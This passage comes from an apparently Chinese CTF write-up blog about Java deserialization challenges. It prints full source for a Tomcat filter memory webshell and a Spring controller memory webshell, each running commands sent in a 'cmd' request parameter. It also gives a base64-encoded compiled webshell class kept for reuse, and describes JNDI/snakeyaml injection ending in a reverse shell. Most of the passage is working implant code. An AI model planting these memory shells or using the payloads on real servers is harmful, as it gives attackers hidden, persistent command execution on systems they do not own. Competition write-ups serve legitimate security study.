class=\"string\">&quot;cmd&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> ServletContext <span class=\"title\">getServletContext</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">                <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">            ServletRequest servletRequest = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            <span class=\"comment\">// shell注入，前提需要能拿到request、response等</span></span><br><span class=\"line\">            Class c = Class.forName(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class=\"line\">            java.lang.reflect.Field f = c.getDeclaredField(<span class=\"string\">&quot;lastServicedRequest&quot;</span>);</span><br><span class=\"line\">            f.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">            ThreadLocal threadLocal = (ThreadLocal) f.get(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 不为空则意味着第一次反序列化的准备工作已成功</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (threadLocal != <span class=\"keyword\">null</span> &amp;&amp; threadLocal.get() != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                servletRequest = (ServletRequest) threadLocal.get();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果不能去到request，则换一种方式尝试获取</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// spring获取法1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (servletRequest == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    c =</span><br><span class=\"line\">                            Class.forName(</span><br><span class=\"line\">                                    <span class=\"string\">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class=\"line\">                    Method m = c.getMethod(<span class=\"string\">&quot;getRequestAttributes&quot;</span>);</span><br><span class=\"line\">                    Object o = m.invoke(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">                    c =</span><br><span class=\"line\">                            Class.forName(</span><br><span class=\"line\">                                    <span class=\"string\">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class=\"line\">                    m = c.getMethod(<span class=\"string\">&quot;getRequest&quot;</span>);</span><br><span class=\"line\">                    servletRequest = (ServletRequest) m.invoke(o);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (servletRequest != <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> servletRequest.getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// spring获取法2</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                c = Class.forName(<span class=\"string\">&quot;org.springframework.web.context.ContextLoader&quot;</span>);</span><br><span class=\"line\">                Method m = c.getMethod(<span class=\"string\">&quot;getCurrentWebApplicationContext&quot;</span>);</span><br><span class=\"line\">                Object o = m.invoke(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">                c = Class.forName(<span class=\"string\">&quot;org.springframework.web.context.WebApplicationContext&quot;</span>);</span><br><span class=\"line\">                m = c.getMethod(<span class=\"string\">&quot;getServletContext&quot;</span>);</span><br><span class=\"line\">                ServletContext servletContext = (ServletContext) m.invoke(o);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> servletContext;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span></span></span><br><span class=\"line\"><span class=\"function\">                <span class=\"keyword\">throws</span> TransletException </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span></span><br><span class=\"line\"><span class=\"function\">                <span class=\"keyword\">throws</span> TransletException </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                ServletRequest servletRequest,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                ServletResponse servletResponse,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                FilterChain filterChain)</span></span></span><br><span class=\"line\"><span class=\"function\">                <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">            System.out.println(</span><br><span class=\"line\">                    <span class=\"string\">&quot;TomcatShellInject doFilter&quot;</span>);</span><br><span class=\"line\">            String cmd;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class=\"line\">                java.io.BufferedReader bufferedReader =</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> java.io.BufferedReader(</span><br><span class=\"line\">                                <span class=\"keyword\">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class=\"line\">                StringBuilder stringBuilder = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">                String line;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((line = bufferedReader.readLine()) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    stringBuilder.append(line + <span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class=\"line\">                servletResponse.getOutputStream().flush();</span><br><span class=\"line\">                servletResponse.getOutputStream().close();</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"羊城杯-simple-json\"><a href=\"#羊城杯-simple-json\" class=\"headerlink\" title=\"羊城杯-simple_json\"></a>羊城杯-simple_json</h1><ul>\n<li>高版本JNDI注入</li>\n<li>snakeyaml</li>\n</ul>\n<p>存在一个fastjson的反序列化点</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20220904122338281.png\" alt=\"image-20220904122338281\"></p>\n<p>自写了一个JNDI类，可jndi注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20220904122427746.png\" alt=\"image-20220904122427746\"></p>\n<p>那么就是打高版本jdk的JNDI注入，这里可用snakeyaml打。</p>\n<p>构建恶意jar包：<a href=\"https://github.com/artsploit/yaml-payload\">https://github.com/artsploit/yaml-payload</a></p>\n<p>找到一个支持snakeyaml的现成jndi注入工具：<a href=\"https://github.com/wyzxxz/jndi_tool%EF%BC%8C%E6%88%96%E8%80%85%E6%9C%AC%E5%9C%B0%E6%9E%84%E5%BB%BARMI%E6%9C%8D%E5%8A%A1%E7%9A%84jar%E5%8C%85%E6%94%BE%E5%88%B0%E5%85%AC%E7%BD%91%E4%B8%8A\">https://github.com/wyzxxz/jndi_tool，或者本地构建RMI服务的jar包放到公网上</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20220904125752719.png\" alt=\"image-20220904125752719\"></p>\n<p>反弹shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20220904125814748.png\" alt=\"image-20220904125814748\"></p>\n<h1 id=\"第三届祥云杯-ezjava\"><a href=\"#第三届祥云杯-ezjava\" class=\"headerlink\" title=\"第三届祥云杯-ezjava\"></a>第三届祥云杯-ezjava</h1><p>cc4组件，而且反序列的点没有任何限制，属于是直接白给了，直接反序列化打内存马。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20221029144633774.png\" alt=\"image-20221029144633774\"></p>\n<p>内存马：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc_1</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc_1</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException, NoSuchMethodException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        Method method = poc_1.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        poc_1 injectToController = <span class=\"keyword\">new</span> poc_1(<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc_1</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class=\"line\">        PrintWriter writer = response.getWriter();</span><br><span class=\"line\">        String cmd = request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            ProcessBuilder p;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Scanner c = (<span class=\"keyword\">new</span> Scanner(p.start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\\\\\A&quot;</span>);</span><br><span class=\"line\">            o = c.hasNext() ? c.next() : o;</span><br><span class=\"line\">            c.close();</span><br><span class=\"line\">            writer.write(o);</span><br><span class=\"line\">            writer.flush();</span><br><span class=\"line\">            writer.close();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            response.sendError(<span class=\"number\">404</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        poc_1 t = <span class=\"keyword\">new</span> poc_1();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译后进行base64编码，以后比赛可能就比较方便使用，base64如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">yv66vgAAADQA7QoAOQCACgCBAIIIAIMLAIQAhQcAhgcAhwsABQCIBwCJCABVBwCKCgAKAIsHAIwHAI0IAI4KAAwAjwcAkAcAkQoAEACSBwCTCgATAJQIAJUKAAgAlgoABgCXBwCYCgAYAJkKABgAmgsAmwCcCABjCwCdAJ4IAJ8IAKAKAKEAogoADQCjCACkCgANAKUHAKYIAKcIAKgKACQAjwgAqQgAqgcAqwoAJACsCgCtAK4KACoArwgAsAoAKgCxCgAqALIKACoAswoAKgC0CgC1ALYKALUAtwoAtQC0BwC4CwCbALkKAAgAgAcAugEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHBvY18xOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC7BwC8AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADdG1wAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAIkHAL0HAL4HAL8HAI0HAKYHAKsHALgBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDAAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAEAClNvdXJjZUZpbGUBAApwb2NfMS5qYXZhDAA6ADsHAMEMAMIAwwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAxAwAxQDGAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDADHAMgBAAVwb2NfMQEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAYvc2hlbGwMADoAegEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOgDLAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAOgDMAQADeHh4DAA6AFEMAM0AzgEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAM8A0AwA0QDSBwC+DADTANQHAL0MANUA1gEAAAEAB29zLm5hbWUHANcMANgA1gwA2QDaAQADd2luDADbANwBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwA3QDeBwDfDADgAOEMADoA4gEAA1xcQQwA4wDkDADlAOYMAOcA2gwA6AA7BwC&#x2F;DADpAFEMAOoAOwEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOsA7AEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOQAAAAAABgABADoAOwACADwAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPQAAACoACgAAABYABAAYABMAGQAfABoAKwAbAD0AHABKAB0AXAAeAGcAHwBwACAAPgAAAFIACAAAAHEAPwBAAAAAEwBeAEEAQgABAB8AUgBDAEQAAgArAEYARQBGAAMAPQA0AEcASAAEAEoAJwBJAEoABQBcABUASwBMAAYAZwAKAE0AQAAHAE4AAAAGAAIATwBQAAEAOgBRAAIAPAAAAD0AAQACAAAABSq3AAGxAAAAAgA9AAAACgACAAAAIgAEACQAPgAAABYAAgAAAAUAPwBAAAAAAAAFAFIAUwABAFQAAAAFAQBSAAAAAQBVADsAAgA8AAAB4QAGAAgAAADGuAACwAAYwAAYtgAZTLgAAsAAGMAAGLYAGk0suQAbAQBOKxIcuQAdAgA6BBIeOgUSH7gAILYAIRIitgAjmQAiuwAkWQa9A